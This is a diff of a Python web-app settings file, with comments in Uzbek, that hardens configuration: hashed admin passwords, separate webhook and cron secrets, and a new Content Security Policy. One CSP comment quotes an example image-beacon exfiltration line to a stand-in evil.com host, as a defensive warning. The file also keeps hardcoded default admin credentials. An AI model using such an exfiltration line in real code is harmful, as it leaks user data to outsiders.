@@ -84,6 +84,24 @@ AI_RETRY_DELAY = 2
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHANNEL_ID = os.getenv("TELEGRAM_CHANNEL_ID")
 TELEGRAM_ADMIN_ID = os.getenv("TELEGRAM_ADMIN_ID")
+
+
+def _normalize_webhook_secret(raw):
+    """Telegram secret_token uchun yaroqli qiymat qaytaradi.
+
+    Telegram faqat A-Z, a-z, 0-9, _ va - belgilariga (1-256) ruxsat beradi.
+    Boshqa belgi bo'lsa set_webhook xato beradi, shuning uchun bunday qiymat
+    barqaror sha256 hex ko'rinishiga o'giriladi.
+    """
+    import hashlib
+    import re as _re
+
+    value = (raw or "").strip()
+    if not value:
+        return ""
+    if _re.fullmatch(r"[A-Za-z0-9_-]{1,256}", value):
+        return value
+    return hashlib.sha256(value.encode("utf-8")).hexdigest()
 TELEGRAM_MAX_MESSAGE_LENGTH = 4096
 TELEGRAM_RETRY_ATTEMPTS = 3
 
@@ -92,11 +110,26 @@ DEFAULT_ADMIN_USERNAME = "admin"
 DEFAULT_ADMIN_PASSWORD = "trendoai2025"
 DEFAULT_SECRET_KEY = "trendoai-secret-key-change-in-production"
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", DEFAULT_ADMIN_USERNAME)
-ADMIN_PASSWORD = _require_production_secret(
-    "ADMIN_PASSWORD",
-    os.getenv("ADMIN_PASSWORD", DEFAULT_ADMIN_PASSWORD),
-    DEFAULT_ADMIN_PASSWORD,
-)
+
+# ADMIN_PASSWORD_HASH berilgan bo'lsa, ochiq parol umuman saqlanmaydi.
+# Hash yaratish: python scripts/generate_admin_hash.py
+ADMIN_PASSWORD_HASH = (os.getenv("ADMIN_PASSWORD_HASH") or "").strip()
+
+if ADMIN_PASSWORD_HASH:
+    # Hash rejimida ochiq ADMIN_PASSWORD talab qilinmaydi.
+    ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "")
+else:
+    ADMIN_PASSWORD = _require_production_secret(
+        "ADMIN_PASSWORD",
+        os.getenv("ADMIN_PASSWORD", DEFAULT_ADMIN_PASSWORD),
+        DEFAULT_ADMIN_PASSWORD,
+    )
+    if not DEBUG:
+        print(
+            "OGOHLANTIRISH: ADMIN_PASSWORD ochiq matnda saqlanmoqda. "
+            "ADMIN_PASSWORD_HASH ga o'tish tavsiya etiladi "
+            "(python scripts/generate_admin_hash.py)."
+        )
 SECRET_KEY = _require_production_secret(
     "SECRET_KEY",
     os.getenv("SECRET_KEY", DEFAULT_SECRET_KEY),
@@ -114,8 +147,6 @@ VAPID_CLAIMS_SUB = "mailto:admin@trendoai.uz"
 TIMEZONE = "Asia/Tashkent"
 SEO_POST_HOUR = 9
 SEO_POST_MINUTE = 0
-MARKETING_POST_HOUR = 12
-MARKETING_POST_MINUTE = 0
 
 # ========== CRON SOZLAMALARI ==========
 # Tashqi cron xizmatlari uchun secret key
@@ -126,6 +157,21 @@ CRON_SECRET = _require_production_secret(
     DEFAULT_CRON_SECRET,
 )
 
+# ========== TELEGRAM WEBHOOK SIRI ==========
+# Cron endpointlari va Telegram webhook ikki xil ishonch chegarasi — bitta sir
+# ikkalasini himoya qilmasligi kerak. TELEGRAM_WEBHOOK_SECRET berilmasa,
+# deploy buzilmasligi uchun CRON_SECRET ga qaytiladi va ogohlantirish yoziladi.
+_RAW_TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET")
+if not _RAW_TELEGRAM_WEBHOOK_SECRET:
+    if not DEBUG:
+        print(
+            "OGOHLANTIRISH: TELEGRAM_WEBHOOK_SECRET berilmagan, CRON_SECRET ishlatilmoqda. "
+            "Ikkala sirni ajratish uchun Render'da alohida qiymat qo'ying."
+        )
+    _RAW_TELEGRAM_WEBHOOK_SECRET = CRON_SECRET
+
+TELEGRAM_WEBHOOK_SECRET = _normalize_webhook_secret(_RAW_TELEGRAM_WEBHOOK_SECRET)
+
 # ========== ANALYTICS & REMARKETING ==========
 # Google Analytics 4 (G-XXXXXXXXXX formatida)
 GA4_ID = os.getenv("GA4_ID")
@@ -135,6 +181,66 @@ GOOGLE_ADS_ID = os.getenv("GOOGLE_ADS_ID")
 FACEBOOK_PIXEL_ID = os.getenv("FACEBOOK_PIXEL_ID", "1192818429057379")
 # Meta Conversions API Access Token (Faqat xavfsiz muhit o'zgaruvchisi orqali)
 FB_CONVERSIONS_API_TOKEN = os.getenv("FB_CONVERSIONS_API_TOKEN")
+# Meta ilova siri — lead webhook imzosini (X-Hub-Signature-256) tekshirish uchun.
+# Berilmasa, webhook imzosiz qabul qilinadi (eski xulq) va ogohlantirish chiqadi.
+FB_APP_SECRET = os.getenv("FB_APP_SECRET")
+
+# ========== CONTENT SECURITY POLICY ==========
+# Barcha bajariladigan JS tashqi fayllarda (static/js/), shablonlarda inline
+# skript ham, inline event handler ham yo'q. style-src da 'unsafe-inline'
+# saqlanadi: 126 ta style="" atributi bor va ularni nonce qamrab olmaydi.
+_CSP_DIRECTIVES = [
+    "default-src 'self'",
+    # Bosqich 2 tugadi: shablonlarda bajariladigan inline skript ham,
+    # inline event handler ham qolmadi, shuning uchun 'unsafe-inline' olib
+    # tashlandi. Endi CSP haqiqiy XSS himoyasi beradi.
+    (
+        "script-src 'self' "
+        "https://www.googletagmanager.com https://www.google-analytics.com "
+        "https://connect.facebook.net https://telegram.org"
+    ),
+    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com",
+    "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com",
+    # Post va portfolio rasmlari bazadan keladi va admin istalgan domen
+    # kiritishi mumkin, shuning uchun hozircha barcha HTTPS manbalar ochiq.
+    # S3/R2 yoqilgach bu qator qat'iy ro'yxatga almashtirilsin — aks holda
+    # `new Image().src = 'https://evil.com/?d=' + data` eksfiltratsiya kanali ochiq qoladi.
+    "img-src 'self' data: blob: https:",
+    (
+        "connect-src 'self' "
+        "https://www.google-analytics.com https://region1.google-analytics.com "
+        "https://analytics.google.com https://stats.g.doubleclick.net "
+        "https://www.facebook.com"
+    ),
+    # Meta Pixel iframe fallback ishlatadi (brauzerda tasdiqlangan)
+    "frame-src 'self' https://www.youtube.com https://www.facebook.com",
+    "media-src 'self' https:",
+    "worker-src 'self'",
+    "manifest-src 'self'",
+    "object-src 'none'",
+    "base-uri 'self'",
+    # Pixel https://www.facebook.com/tr/ ga form POST qiladi
+    "form-action 'self' https://www.facebook.com",
+    "frame-ancestors 'self'",
+]
+
+CSP_POLICY = "; ".join(_CSP_DIRECTIVES + ["upgrade-insecure-requests"])
+
+# upgrade-insecure-requests report-only rejimda brauzer tomonidan e'tiborsiz
+# qoldiriladi va konsolga ogohlantirish yozadi — shuning uchun tashlab ketiladi.
+CSP_REPORT_ONLY_POLICY = "; ".join(_CSP_DIRECTIVES)
+
+# Allaqachon jonli ishlayotgan va hech narsani buzmasligi tasdiqlangan minimal to'plam.
+CSP_BASELINE_POLICY = (
+    "object-src 'none'; base-uri 'self'; frame-ancestors 'self'; "
+    # form-action 'self' Meta Pixel'ning /tr/ ga form POSTini bloklab kelgan —
+    # brauzer konsolida "The request has been blocked" bilan tasdiqlandi.
+    "form-action 'self' https://www.facebook.com; upgrade-insecure-requests"
+)
+
+# Yangi siyosat avval kuzatuv rejimida ishlaydi. Konsolda buzilish
+# ko'rinmasa, CSP_ENFORCE=true qo'yib majburiy rejimga o'tkaziladi.
+CSP_ENFORCE = (os.getenv("CSP_ENFORCE", "false") or "").strip().lower() in ("1", "true", "yes", "on")
 
 # ========== PAGINATION ==========
 POSTS_PER_PAGE = 10
